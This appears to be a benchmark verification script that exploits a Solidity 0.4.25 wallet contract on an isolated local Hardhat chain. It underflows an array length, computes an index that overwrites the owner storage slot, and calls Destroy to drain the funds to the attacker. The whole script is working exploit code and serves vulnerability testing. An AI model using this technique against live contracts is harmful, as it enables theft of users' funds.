'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, Contract, keccak256, toBeHex } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CASE_ID = '01-arbitrary_location_write_simple';
const SOURCE_FILE = 'arbitrary_location_write_simple.sol';
const COMPILER_RELEASE = '0.4.25';
const SLOT_MODULUS = 1n << 256n;
const TARGET_FUNDING = 10n ** 18n;

function digest(value) {
  return crypto.createHash('sha256').update(value, 'utf8').digest('hex');
}

function compile(source) {
  const input = {
    language: 'Solidity',
    sources: { [SOURCE_FILE]: { content: source } },
    settings: {
      optimizer: { enabled: false },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  const artifact = output.contracts?.[SOURCE_FILE]?.Wallet;
  if (!artifact?.abi || !artifact?.evm?.bytecode?.object) throw new Error('benchmark_contract_artifact_missing');
  return artifact;
}

function gasCost(receipt) {
  return BigInt(receipt.gasUsed) * BigInt(receipt.gasPrice);
}

(async () => {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  if (caseId !== CASE_ID || path.basename(sourcePath) !== SOURCE_FILE) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const reportedVersion = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  if (reportedVersion !== COMPILER_RELEASE || solc.version().split('+', 1)[0] !== COMPILER_RELEASE) {
    throw new Error(`benchmark_requires_exact_solc_${COMPILER_RELEASE}`);
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('benchmark_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_dynamic_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }

  const artifact = compile(source);
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_evm_chain_id_mismatch');
  const owner = await provider.getSigner(0);
  const attacker = await provider.getSigner(1);
  const victim = await provider.getSigner(2);
  const ownerAddress = await owner.getAddress();
  const attackerAddress = await attacker.getAddress();
  const victimAddress = await victim.getAddress();

  const deployment = await new ContractFactory(artifact.abi, artifact.evm.bytecode.object, owner).deploy();
  const deploymentReceipt = await deployment.deploymentTransaction().wait();
  if (deploymentReceipt.status !== 1) throw new Error('benchmark_deployment_failed');
  await deployment.waitForDeployment();
  const targetAddress = await deployment.getAddress();
  const target = new Contract(targetAddress, artifact.abi, attacker);
  const fundingReceipt = await (await victim.sendTransaction({ to: targetAddress, value: TARGET_FUNDING })).wait();
  if (fundingReceipt.status !== 1) throw new Error('victim_funding_failed');

  const ownerBeforeWord = await provider.send('eth_getStorageAt', [targetAddress, '0x1', 'latest']);
  const arrayLengthBeforeWord = await provider.send('eth_getStorageAt', [targetAddress, '0x0', 'latest']);
  const ownerBefore = `0x${ownerBeforeWord.slice(-40)}`.toLowerCase();
  const arrayLengthBefore = BigInt(arrayLengthBeforeWord);
  const attackerBalanceBefore = await provider.getBalance(attackerAddress, fundingReceipt.blockNumber);
  const targetBalanceBefore = await provider.getBalance(targetAddress, fundingReceipt.blockNumber);
  const popReceipt = await (await target.getFunction('PopBonusCode')({ gasLimit: 500000 })).wait();
  const arrayLengthAfterWord = await provider.send('eth_getStorageAt', [targetAddress, '0x0', 'latest']);
  const arrayLengthAfter = BigInt(arrayLengthAfterWord);

  // Dynamic array elements start at keccak256(slot 0); the owner is at slot 1.
  const elementBase = BigInt(keccak256(toBeHex(0n, 32)));
  const ownerIndex = (1n - elementBase + SLOT_MODULUS) % SLOT_MODULUS;
  if (ownerIndex >= arrayLengthAfter || ownerIndex === SLOT_MODULUS - 1n) {
    throw new Error('calculated_owner_index_out_of_bounds');
  }
  const updateReceipt = await (await target.getFunction('UpdateBonusCodeAt')(
    ownerIndex, BigInt(attackerAddress), { gasLimit: 500000 },
  )).wait();
  const ownerAfterWriteWord = await provider.send('eth_getStorageAt', [targetAddress, '0x1', 'latest']);
  const ownerAfterWrite = `0x${ownerAfterWriteWord.slice(-40)}`.toLowerCase();
  const destroyReceipt = await (await target.getFunction('Destroy')({ gasLimit: 500000 })).wait();
  const targetBalanceAfter = await provider.getBalance(targetAddress, destroyReceipt.blockNumber);
  const attackerBalanceAfter = await provider.getBalance(attackerAddress, destroyReceipt.blockNumber);
  const attackGasCost = gasCost(popReceipt) + gasCost(updateReceipt) + gasCost(destroyReceipt);
  const attackerNetProfit = attackerBalanceAfter + attackGasCost - attackerBalanceBefore;
  const confirmed = deploymentReceipt.status === 1
    && fundingReceipt.status === 1
    && popReceipt.status === 1
    && updateReceipt.status === 1
    && destroyReceipt.status === 1
    && ownerBefore === ownerAddress.toLowerCase()
    && arrayLengthBefore === 0n
    && arrayLengthAfter === SLOT_MODULUS - 1n
    && ownerAfterWrite === attackerAddress.toLowerCase()
    && targetBalanceBefore === TARGET_FUNDING
    && targetBalanceAfter === 0n
    && attackerNetProfit === TARGET_FUNDING;
  const result = {
    schemaVersion: 1,
    caseId: CASE_ID,
    state: confirmed ? 'passed' : 'failed',
    confirmedVulnerability: confirmed,
    vulnerability: 'access_control',
    proofScope: 'attacker_owner_takeover_and_contract_balance_drain',
    mode: 'isolated_in_process',
    compilerVersion: solc.version(),
    compilerArtifactSha256: compilerArtifactSha256.startsWith('0x') ? compilerArtifactSha256 : `0x${compilerArtifactSha256}`,
    compilerKind: 'solc-js-original-source',
    sourceSha256,
    targetAddress,
    ownerAddress,
    attackerAddress,
    victimAddress,
    arrayLengthBefore: arrayLengthBefore.toString(),
    arrayLengthAfter: arrayLengthAfter.toString(),
    ownerStorageSlot: '1',
    ownerIndex: ownerIndex.toString(),
    ownerBefore,
    ownerAfterWrite,
    targetBalanceBeforeWei: targetBalanceBefore.toString(),
    targetBalanceAfterWei: targetBalanceAfter.toString(),
    attackerNetProfitWei: attackerNetProfit.toString(),
    attackGasCostWei: attackGasCost.toString(),
    transactionStatuses: [deploymentReceipt.status, fundingReceipt.status, popReceipt.status,
      updateReceipt.status, destroyReceipt.status],
    transactionHashes: [deploymentReceipt.hash, fundingReceipt.hash, popReceipt.hash, updateReceipt.hash, destroyReceipt.hash],
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'underflow_owner_overwrite_or_asset_withdrawal_assertion_failed',
    reproduction: '攻击者对空 bonusCodes 调用 PopBonusCode 使长度下溢，反算覆盖 owner 槽的数组索引并调用 UpdateBonusCodeAt，再调用 Destroy 将受害者注入的 ETH 转给攻击者。',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
